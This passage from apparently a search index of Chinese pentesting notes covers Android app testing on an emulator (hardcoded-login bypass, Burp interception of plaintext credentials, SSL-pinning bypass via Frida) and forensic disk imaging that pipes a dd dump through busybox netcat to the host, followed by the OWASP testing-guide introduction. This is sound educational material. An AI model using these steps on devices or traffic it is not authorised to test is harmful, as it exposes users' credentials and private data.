\u6267\u884c\u6b64\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e2d\u952e\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1aadb uninstall com.example.demo</p> <p></p> <p>\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u7ee7\u7eed\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u6765\u5b89\u88c5\u65b0\u7684 APK\uff1aadb install demo.apk</p> <p></p> <p>\u5728 UI \u4e2d\uff0c\u6211\u4eec\u627e\u5230\u5e94\u7528\u7a0b\u5e8f\u540d\u79f0 Demo \u5e76\u70b9\u51fb\u5b83\u3002\u4e00\u65e6\u6253\u5f00\uff0c\u6211\u4eec\u8f93\u5165\u7528\u6237\u540dadmin\uff0c\u5c31\u50cf\u6211\u4eec\u5728\u4e0a\u4e00\u6b65\u7684\u6e90\u4ee3\u7801\u4e2d\u770b\u5230\u7684\u90a3\u6837\uff0c\u7136\u540e\u63d0\u4f9b\u4e00\u4e2a\u968f\u673a\u5bc6\u7801\u3002</p> <p></p> <p>\u63d0\u793a\u201c\u767b\u5f55\u6210\u529f\uff01\u201d\u00a0\u5c4f\u5e55\u4e0a\u663e\u793a\uff0c\u8868\u793a\u6211\u4eec\u5df2\u6210\u529f\u7ed5\u8fc7\u6b64\u5e94\u7528\u7a0b\u5e8f\u7684\u767b\u5f55\u5c4f\u5e55\u3002\u66f4\u591a\u7684\u9006\u5411\u5de5\u7a0b\u6280\u672f\u53ef\u7528\u4e8e\u9759\u6001\u548c\u52a8\u6001\u5206\u6790\uff0c\u4f7f\u7528 Ghidra \u548c Frida \u7b49\u5de5\u5177\uff0c\u4f46\u8fd9\u5c06\u662f\u672a\u6765\u535a\u5ba2\u6587\u7ae0\u7684\u4e3b\u9898.</p> <p>5.\u62e6\u622a\u7f51\u7edc\u6d41\u91cf</p> <p>\u5728 Android \u4e2d\u4f7f\u7528 Burp Suite \u62e6\u622a HTTP \u8bf7\u6c42\u7684\u8fc7\u7a0b\u5f88\u7b80\u5355\u3002\u8bb8\u591a Android \u5e94\u7528\u7a0b\u5e8f\u6b63\u5728\u4f7f\u7528\u670d\u52a1\u5668\u6765\u8fdc\u7a0b\u5904\u7406\u6216\u5b58\u50a8\u6570\u636e\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u5668\u901a\u4fe1\u65f6\uff0c\u53ef\u4ee5\u62e6\u622a\u8bf7\u6c42/\u54cd\u5e94\uff0c\u5e76\u8bfb\u53d6\u901a\u8fc7 HTTP \u534f\u8bae\u53d1\u9001\u7684\u6570\u636e\u3002</p> <p>\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e2a\u573a\u666f\uff0c\u5176\u4e2d\u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u4e00\u4e2a\u767b\u5f55\u8868\u5355\uff0c\u8be5\u8868\u5355\u5c06\u6570\u636e\u53d1\u9001\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u4ee5\u4fbf\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6b64\u5916\uff0c\u6b64\u5e94\u7528\u7a0b\u5e8f\u5b58\u50a8\u4e86\u5148\u524d\u4f1a\u8bdd\u4e2d\u7684\u7528\u6237\u51ed\u636e\uff0c\u4f46\u5bc6\u7801\u662f\u9690\u85cf\u7684\uff0c\u56e0\u6b64\u65e0\u6cd5\u8bfb\u53d6\u3002</p> <p></p> <p>\u5047\u8bbe\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u62e6\u622a HTTP \u8bf7\u6c42\u6765\u8bfb\u53d6\u5bc6\u7801\u3002Android \u865a\u62df\u8bbe\u5907 (AVD) \u63d0\u4f9b\u4e86\u4e00\u4e2a\u914d\u7f6e\u9009\u9879\u5361\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u8bbe\u7f6e\u4ee3\u7406\u9996\u9009\u9879\uff0c\u4f4d\u4e8e Settings -&gt; Proxy \u4e0b\u3002\u52fe\u9009 Manual Proxy Configuration \u9009\u9879\uff0c\u7136\u540e\u8bbe\u7f6e\u4e3b\u673a\u7684 IP \u5730\u5740\u548c\u7aef\u53e3 8080\u3002</p> <p></p> <p>\u5728 AVD \u4e0a\u914d\u7f6e\u4ee3\u7406\u8bbe\u7f6e\u540e\uff0c\u6211\u4eec\u9700\u8981\u7f16\u8f91\u4ee3\u7406\u670d\u52a1\u5668\u7684 IP \u5730\u5740\uff0c\u5c06\u5176\u4ece localhost \u66f4\u6539\u4e3a\u4e3b\u673a\u7684\u672c\u5730 IP \u5730\u5740\u3002</p> <p></p> <p>\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528 Burp \u542f\u52a8\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u7136\u540e\u5355\u51fb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u767b\u5f55\u6309\u94ae\u3002\u6211\u4eec\u5728\u4e0b\u9762\u770b\u5230\u622a\u83b7\u7684\u8bf7\u6c42\uff0c\u4ee5\u53ca\u7eaf\u6587\u672c\u7684\u7528\u6237\u51ed\u636e\u3002</p> <p></p> <p>\u4e3a\u4e86\u7f13\u89e3\u6b64\u7c7b\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u5b89\u5168\u5957\u63a5\u5b57\u5c42 (SSL)\u3002\u5728 Android \u4e2d\u5b9e\u73b0 SSL \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b8c\u6210\u3002\u7136\u800c\uff0c\u7ed5\u8fc7\u8fd9\u4e9b\u5b9e\u73b0\u7684\u6280\u672f\u4e5f\u5df2\u7ecf\u5f00\u53d1\u51fa\u6765\u3002</p> <p>\u4f8b\u5982\uff0cSSL Pinning \u662f\u4e00\u79cd\u7528\u4e8e\u9632\u6b62\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u6280\u672f\u3002\u8fd9\u79cd\u6280\u672f\u8981\u4e48\u5c06\u8bc1\u4e66\u653e\u5728\u5e94\u7528\u7a0b\u5e8f\u5305\u4e2d\uff08\u8bc1\u4e66\u56fa\u5b9a\uff09\uff0c\u8981\u4e48\u5c06\u8bc1\u4e66\u7684\u516c\u94a5\u6216\u54c8\u5e0c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u5305\u542b\u5728\u6e90\u4ee3\u7801\u4e2d\u3002</p> <p>Frida \u662f\u7528\u4e8e\u79fb\u52a8\u8bc4\u4f30\u7684\u8457\u540d\u6846\u67b6\uff0c\u5b83\u5141\u8bb8\u6211\u4eec\u5728\u8fd0\u884c\u65f6\u7be1\u6539\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u3002\u4f7f\u7528 Frida \u5411 APK \u6ce8\u5165\u4ee3\u7801\uff0c\u53ef\u4ee5\u7ed5\u8fc7 SSL pinning\u3002\u5bf9 Frida \u6846\u67b6\u7684\u66f4\u6df1\u5165\u7814\u7a76\u5c06\u6210\u4e3a\u540e\u7eed\u535a\u5ba2\u6587\u7ae0\u7684\u4e3b\u9898\u3002</p> <p>\u53d6\u8bc1\u6709\u52a9\u4e8e\u5f62\u6210\u66f4\u8be6\u7ec6\u7684\u79fb\u52a8\u5b89\u5168\u56fe\u666f</p> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u9006\u5411\u5de5\u7a0b\u4e0d\u4f1a\u5411\u60a8\u663e\u793a\u6076\u610f\u8f6f\u4ef6\u611f\u67d3\u6216\u53d7\u611f\u67d3\u7684\u5e94\u7528\u7a0b\u5e8f\u9020\u6210\u7684\u771f\u6b63\u635f\u5bb3\uff0c\u8fd9\u5c31\u662f\u53d6\u8bc1\u7684\u7528\u6b66\u4e4b\u5730\u3002\u53d6\u8bc1\u68c0\u67e5\u5c06\u5e2e\u52a9\u60a8\u8bc6\u522b\u8fdd\u89c4\u8bc1\u636e\u5e76\u9632\u6b62\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u5728\u672a\u6765\u53d7\u5230\u635f\u5bb3\u63ed\u793a\u6f0f\u6d1e\u80cc\u540e\u7684\u66f4\u591a\u7ec6\u8282\u3002</p> <p>\u5bf9\u4e8e Android \u8bbe\u5907\uff0c\u53ef\u4ee5\u5236\u4f5c\u78c1\u76d8\u6620\u50cf\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u4f7f\u7528Autopsy\u7b49\u5de5\u5177\u8fdb\u4e00\u6b65\u68c0\u67e5\u5b83\u3002Autopsy \u662f\u4e00\u4e2a\u5728 Windows \u4e0a\u8fd0\u884c\u826f\u597d\u7684\u5f00\u6e90\u6570\u5b57\u53d6\u8bc1\u5e73\u53f0\u3002\u6b64\u5de5\u5177\u53ef\u4ee5\u5e2e\u52a9\u60a8\u4ece\u78c1\u76d8\u4e2d\u68c0\u7d22\u5df2\u5220\u9664\u7684\u6587\u4ef6\u548c\u56fe\u50cf\u3001\u8bfb\u53d6\u6570\u636e\u5e93\u3001EXIF \u6570\u636e\u3001SMS \u548c\u7535\u8bdd\u65e5\u5fd7\u3001\u8bfb\u53d6\u7f51\u7edc\u6d4f\u89c8\u5668\u7684\u5386\u53f2\u8bb0\u5f55\u7b49\u7b49\u3002</p> <p>Android \u78c1\u76d8\u6620\u50cf\u53ef\u4ee5\u5728\u6709\u6839\u7684\u8bbe\u5907\u4e2d\u83b7\u53d6\u3002\u690d\u6839 Android \u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b8c\u6210\u3002\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4ee5 root \u7528\u6237\u8eab\u4efd\u8bbf\u95ee\u8bbe\u5907\u7684\u7ec8\u7aef\u4e0e root \u8bbe\u5907\u672c\u8eab\u662f\u5b8c\u5168\u4e0d\u540c\u7684\u4e8b\u60c5\u3002\u6309\u7167\u8fd9\u4e2a GitHub\u9879\u76ee\u4e2d\u7684\u8bf4\u660e\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u5bf9\u6211\u4eec\u4e4b\u524d\u5728 Android Studio \u4e2d\u8bbe\u7f6e\u7684 Nexus 5X \u7b49 AVD \u8fdb\u884c\u751f\u6839\u3002\u4e0b\u56fe\u663e\u793a\u4e86\u5e94\u7528\u7a0b\u5e8f RootChecker \u5728\u6210\u529f\u690d\u6839\u8bbe\u5907\u540e\u7684\u7ed3\u679c\u3002</p> <p></p> <p>\u8bbe\u5907\u690d\u6839\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528dd\u00a0Unix \u5b9e\u7528\u7a0b\u5e8f\u83b7\u53d6\u78c1\u76d8\u6620\u50cf\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4ecb\u7ecd\u5e94\u7528\u7a0b\u5e8f BusyBox\u3002BusyBox \u662f\u4e00\u4e2a\u8f6f\u4ef6\u5957\u4ef6\uff0c\u5b83\u5728\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u63d0\u4f9b\u4e86\u591a\u4e2a Unix \u5b9e\u7528\u7a0b\u5e8f\u3002\u5b83\u53ef\u4ee5\u901a\u8fc7 ADB \u5b89\u88c5\u5728\u6709\u6839\u8bbe\u5907\u4e0a\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u5b89\u88c5\u4e86 BusyBox \u7684\u6839 AVD\uff0c\u6211\u4eec\u9700\u8981\u83b7\u53d6\u7684\u5206\u533a\u662f\u6302\u8f7d\u5728 <code>/data</code> \u76ee\u5f55\u4e2d\u7684\u5206\u533a\u3002Android \u8bbe\u5907\u4e0a\u5b89\u88c5\u7684\u5206\u533a\u53ef\u80fd\u5982\u4e0b\u6240\u793a\u3002</p> <p></p> <p>\u786c\u4ef6\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u548c\u7279\u6b8a\u8bbe\u5907\u6587\u4ef6\u5c31\u50cf\u666e\u901a\u6587\u4ef6\u4e00\u6837\u51fa\u73b0\u5728\u6587\u4ef6\u7cfb\u7edf\u4e2d\u3002dd\u00a0\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u80fd\u591f\u5907\u4efd\u786c\u76d8\u9a71\u52a8\u5668\u7684\u5f15\u5bfc\u6247\u533a\u3002\u4e00\u65e6\u6211\u4eec\u627e\u5230\u4e86\u6b63\u786e\u7684\u5206\u533a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528dd\u00a0\u83b7\u53d6\u78c1\u76d8\u6620\u50cf\uff0c\u5e76nc\u00a0\u4ece BusyBox \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5c06\u78c1\u76d8\u6620\u50cf\u76f4\u63a5\u53d1\u9001\u5230\u6211\u4eec\u7684\u4e3b\u673a\u3002\u4ee5\u4e0b\u547d\u4ee4\u83b7\u53d6\u78c1\u76d8\u6620\u50cf\uff0c\u5e76\u542f\u52a8\u4fa6\u542c\u5668\u3002</p> <p>adb shell \"dd if=/dev/block/dm-0 | busybox nc -l -p 8888\" &amp;</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f7f\u7528 ADB \u5728\u7aef\u53e3 8888 \u4e0a\u8f6c\u53d1\u6d41\u91cf\u3002</p> <p>adb forward tcp:8888 tcp:8888</p> <p>\u6700\u540e\uff0c\u6211\u4eec\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5728\u672c\u5730\u83b7\u53d6\u78c1\u76d8\u6620\u50cf\u3002</p> <p>nc 127.0.0.1 8888 &gt; disk.dd</p> <p></p> <p>\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u542f\u52a8 Autopsy \u5e76\u6309\u7167\u63d0\u4f9b\u7684\u6b65\u9aa4\u52a0\u8f7d\u78c1\u76d8\u6620\u50cf\u3002\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u4e3a\u65b0\u6848\u4f8b\u547d\u540d\u3002</p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u8bbe\u7f6e\u6848\u4f8b\u7f16\u53f7\u3002</p> <p></p> <p>\u5728\u4e0b\u4e00\u6b65\u4e2d\uff0c\u9009\u62e9\u4e3b\u673a\u540d\u548c\u6570\u636e\u6e90\u7c7b\u578b\u3002</p> <p></p> <p>\u7136\u540e\u9009\u62e9\u6211\u4eec\u4e4b\u524d\u83b7\u53d6\u7684\u78c1\u76d8\u6620\u50cf\uff0c\u5e76\u5c06\u5176\u52a0\u8f7d\u4e3a\u6570\u636e\u6e90\u3002</p> <p></p> <p>\u6700\u540e\uff0c\u5355\u51fb\u4e0b\u4e00\u6b65\u5e76\u5b8c\u6210\u3002</p> <p></p> <p>\u81f3\u6b64\uff0c\u78c1\u76d8\u955c\u50cf\u5e94\u8be5\u5df2\u7ecf\u52a0\u8f7d\u6210\u529f\u4e86\u3002\u67e5\u770b\u5de6\u4fa7\u7a97\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6298\u53e0\u83dc\u5355\uff0c\u5141\u8bb8\u6211\u4eec\u6d4f\u89c8\u4ece\u8bbe\u5907\u6536\u96c6\u7684\u6587\u4ef6\u3002</p> <p>Autopsy \u7684\u4e00\u4e2a\u91cd\u8981\u529f\u80fd\u662f\u80fd\u591f\u4ece\u8bbe\u5907\u4e2d\u6062\u590d\u5df2\u5220\u9664\u7684\u6587\u4ef6\u3002\u4e0b\u56fe\u663e\u793a\u5df2\u5220\u9664\u7684\u6587\u4ef6 Credentials.xlsx \u5df2\u6062\u590d\u3002</p> <p></p> <p>\u7ec3\u4e60\u60a8\u7684 Android \u6e17\u900f\u6d4b\u8bd5\u6280\u80fd</p> <p>\u672c\u6587\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u7528\u4e8e\u8bc4\u4f30 Android \u5e94\u7528\u7a0b\u5e8f\u6216\u8bbe\u5907\u5b89\u5168\u6027\u7684\u6700\u5e38\u7528\u6280\u672f\u3002\u79fb\u52a8\u8bbe\u5907\u662f\u6211\u4eec\u65e5\u5e38\u751f\u6d3b\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u90e8\u5206\uff0c\u9884\u8ba1\u672a\u6765\u51e0\u5e74\u5bf9\u5982\u4f55\u4fdd\u62a4\u548c\u7834\u89e3\u8fd9\u4e9b\u8bbe\u5907\u7684\u5174\u8da3\u5c06\u4f1a\u589e\u52a0\u3002</p> <p>\u5b66\u4e60\u6211\u4eec\u6240\u4ecb\u7ecd\u7684\u6280\u672f\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u5728\u53ef\u4ee5\u4f7f\u7528\u5e38\u89c1 Android \u6f0f\u6d1e\u5229\u7528\u5411\u91cf\u7684\u771f\u5b9e\u73af\u5883\u4e2d\u6d4b\u8bd5\u60a8\u7684\u6280\u80fd\uff01</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/","title":"\u7b80\u4ecb\u548c\u76ee\u6807","text":"<p>\u672c\u8282\u63cf\u8ff0\u4e86 OWASP Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u5e76\u89e3\u91ca\u4e86\u5982\u4f55\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7531\u4e8e\u5df2\u8bc6\u522b\u7684\u5b89\u5168\u63a7\u5236\u7f3a\u9677\u800c\u5b58\u5728\u6f0f\u6d1e\u7684\u8bc1\u636e\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#web","title":"\u4ec0\u4e48\u662f Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\uff1f","text":"<p>\u5b89\u5168\u6d4b\u8bd5\u662f\u4e00\u79cd\u901a\u8fc7\u7cfb\u7edf\u5730\u9a8c\u8bc1\u548c\u9a8c\u8bc1\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u63a7\u5236\u7684\u6709\u6548\u6027\u6765\u8bc4\u4f30\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7f51\u7edc\u5b89\u5168\u6027\u7684\u65b9\u6cd5\u3002Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u4ec5\u4fa7\u91cd\u4e8e\u8bc4\u4f30 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\u3002\u8be5\u8fc7\u7a0b\u6d89\u53ca\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u5f31\u70b9\u3001\u6280\u672f\u7f3a\u9677\u6216\u6f0f\u6d1e\u8fdb\u884c\u4e3b\u52a8\u5206\u6790\u3002\u53d1\u73b0\u7684\u4efb\u4f55\u5b89\u5168\u95ee\u9898\u5c06\u8fde\u540c\u5f71\u54cd\u8bc4\u4f30\u3001\u7f13\u89e3\u5efa\u8bae\u6216\u6280\u672f\u89e3\u51b3\u65b9\u6848\u4e00\u8d77\u63d0\u4ea4\u7ed9\u7cfb\u7edf\u6240\u6709\u8005\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_2","title":"\u4ec0\u4e48\u662f\u6f0f\u6d1e\uff1f","text":"<p>\u6f0f\u6d1e\u662f\u7cfb\u7edf\u8bbe\u8ba1\u3001\u5b9e\u65bd\u3001\u64cd\u4f5c\u6216\u7ba1\u7406\u4e2d\u7684\u7f3a\u9677\u6216\u5f31\u70b9\uff0c\u53ef\u88ab\u7528\u6765\u7834\u574f\u7cfb\u7edf\u7684\u5b89\u5168\u76ee\u6807\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_3","title":"\u4ec0\u4e48\u662f\u5a01\u80c1\uff1f","text":"<p>\u5a01\u80c1\u662f\u4efb\u4f55\u53ef\u80fd\u635f\u5bb3\u5e94\u7528\u7a0b\u5e8f\u62e5\u6709\u7684\u8d44\u4ea7\uff08\u6709\u4ef7\u503c\u7684\u8d44\u6e90\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6570\u636e\uff09\u7684\u4efb\u4f55\u4e8b\u7269\uff08\u6076\u610f\u7684\u5916\u90e8\u653b\u51fb\u8005\u3001\u5185\u90e8\u7528\u6237\u3001\u7cfb\u7edf\u4e0d\u7a33\u5b9a\u7b49\uff09\u6f0f\u6d1e\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_4","title":"\u4ec0\u4e48\u662f\u6d4b\u8bd5\uff1f","text":"<p>\u6d4b\u8bd5\u662f\u8bc1\u660e\u5e94\u7528\u7a0b\u5e8f\u6ee1\u8db3\u5176\u5229\u76ca\u76f8\u5173\u8005\u7684\u5b89\u5168\u8981\u6c42\u7684\u64cd\u4f5c\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_5","title":"\u7f16\u5199\u672c\u6307\u5357\u7684\u65b9\u6cd5","text":"<p>OWASP \u65b9\u6cd5\u662f\u5f00\u653e\u548c\u534f\u4f5c\u7684\uff1a</p> <ul> <li>\u5f00\u653e\uff1a\u6bcf\u4e00\u4f4d\u5b89\u5168\u4e13\u5bb6\u90fd\u53ef\u4ee5\u5e26\u7740\u4ed6\u4eec\u5728\u9879\u76ee\u4e2d\u7684\u7ecf\u9a8c\u53c2\u4e0e\u3002\u4e00\u5207\u90fd\u662f\u514d\u8d39\u7684\u3002</li> <li>\u534f\u4f5c\uff1a\u5728\u64b0\u5199\u6587\u7ae0\u4e4b\u524d\u8fdb\u884c\u5934\u8111\u98ce\u66b4\uff0c\u4ee5\u4fbf\u56e2\u961f\u53ef\u4ee5\u5206\u4eab\u60f3\u6cd5\u5e76\u5236\u5b9a\u9879\u76ee\u7684\u96c6\u4f53\u613f\u666f\u3002\u8fd9\u610f\u5473\u7740\u7c97\u7565\u7684\u5171\u8bc6\u3001\u66f4\u5e7f\u6cdb\u7684\u53d7\u4f17\u548c\u66f4\u591a\u7684\u53c2\u4e0e\u3002</li> </ul> <p>\u8fd9\u79cd\u65b9\u6cd5\u503e\u5411\u4e8e\u521b\u5efa\u4e00\u4e2a\u5b9a\u4e49\u597d\u7684\u6d4b\u8bd5\u65b9\u6cd5\u8bba\uff0c\u5b83\u5c06\u662f\uff1a</p> <ul> <li>\u6301\u7eed\u7684</li> <li>\u53ef\u91cd\u73b0</li> <li>\u4e25\u683c\u7684</li> <li>\u5728\u8d28\u91cf\u63a7\u5236\u4e0b</li> </ul> <p>\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5df2\u5b8c\u6574\u8bb0\u5f55\u548c\u6d4b\u8bd5\u3002\u4f7f\u7528\u4e00\u79cd\u65b9\u6cd5\u6765\u6d4b\u8bd5\u6240\u6709\u5df2\u77e5\u6f0f\u6d1e\u5e76\u8bb0\u5f55\u6240\u6709\u5b89\u5168\u6d4b\u8bd5\u6d3b\u52a8\u975e\u5e38\u91cd\u8981\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#owasp","title":"\u4ec0\u4e48\u662f OWASP \u6d4b\u8bd5\u65b9\u6cd5\uff1f","text":"<p>\u5b89\u5168\u6d4b\u8bd5\u6c38\u8fdc\u4e0d\u4f1a\u662f\u4e00\u95e8\u7cbe\u786e\u7684\u79d1\u5b66\uff0c\u53ef\u4ee5\u5b9a\u4e49\u5e94\u6d4b\u8bd5\u7684\u6240\u6709\u53ef\u80fd\u95ee\u9898\u7684\u5b8c\u6574\u5217\u8868\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5b89\u5168\u6d4b\u8bd5\u53ea\u662f\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u4e00\u79cd\u9002\u5f53\u6280\u672f\u3002\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u6807\u662f\u6536\u96c6\u6240\u6709\u53ef\u80fd\u7684\u6d4b\u8bd5\u6280\u672f\uff0c\u89e3\u91ca\u8fd9\u4e9b\u6280\u672f\uff0c\u5e76\u4fdd\u6301\u6307\u5357\u66f4\u65b0\u3002OWASP Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u65b9\u6cd5\u57fa\u4e8e\u9ed1\u76d2\u65b9\u6cd5\u3002\u6d4b\u8bd5\u4eba\u5458\u5bf9\u8981\u6d4b\u8bd5\u7684\u5e94\u7528\u7a0b\u5e8f\u4e00\u65e0\u6240\u77e5\u6216\u77e5\u4e4b\u751a\u5c11\u3002</p> <p>\u6d4b\u8bd5\u6a21\u578b\u5305\u62ec\uff1a</p> <ul> <li>\u6d4b\u8bd5\u4eba\u5458\uff1a\u8c01\u6267\u884c\u6d4b\u8bd5\u6d3b\u52a8</li> <li>\u5de5\u5177\u548c\u65b9\u6cd5\uff1a\u672c\u6d4b\u8bd5\u6307\u5357\u9879\u76ee\u7684\u6838\u5fc3</li> <li>\u5e94\u7528\uff1a\u8981\u6d4b\u8bd5\u7684\u9ed1\u76d2</li> </ul> <p>\u6d4b\u8bd5\u53ef\u5206\u4e3a\u88ab\u52a8\u6216\u4e3b\u52a8\uff1a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_6","title":"\u88ab\u52a8\u6d4b\u8bd5","text":"<p>\u5728\u88ab\u52a8\u6d4b\u8bd5\u671f\u95f4\uff0c\u6d4b\u8bd5\u4eba\u5458\u8bd5\u56fe\u7406\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u903b\u8f91\u5e76\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u3002\u5de5\u5177\u53ef\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u3002\u4f8b\u5982\uff0cHTTP \u4ee3\u7406\u53ef\u7528\u4e8e\u89c2\u5bdf\u6240\u6709 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u5728\u6b64\u9636\u6bb5\u7ed3\u675f\u65f6\uff0c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5927\u81f4\u4e86\u89e3\u7cfb\u7edf\u7684\u6240\u6709\u8bbf\u95ee\u70b9\u548c\u529f\u80fd\uff08\u4f8b\u5982\uff0cHTTP \u6807\u5934\u3001\u53c2\u6570\u3001cookie\u3001API\u3001\u6280\u672f\u4f7f\u7528/\u6a21\u5f0f\u7b49\uff09\u3002\u4fe1\u606f\u6536\u96c6\u90e8\u5206\u89e3\u91ca\u4e86\u5982\u4f55\u6267\u884c\u88ab\u52a8\u6d4b\u8bd5\u3002</p> <p>\u4f8b\u5982\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5728\u4ee5\u4e0b URL \u627e\u5230\u4e00\u4e2a\u9875\u9762\uff1a<code>https://www.example.com/login/auth_form</code></p> <p>\u8fd9\u53ef\u80fd\u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1\u8868\u5355\u3002</p> <p>\u4ee5\u4e0b\u53c2\u6570\u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u4e24\u4e2a\u8bbf\u95ee\u70b9\uff1a<code>https://www.example.com/appx?a=1&amp;b=1</code></p> 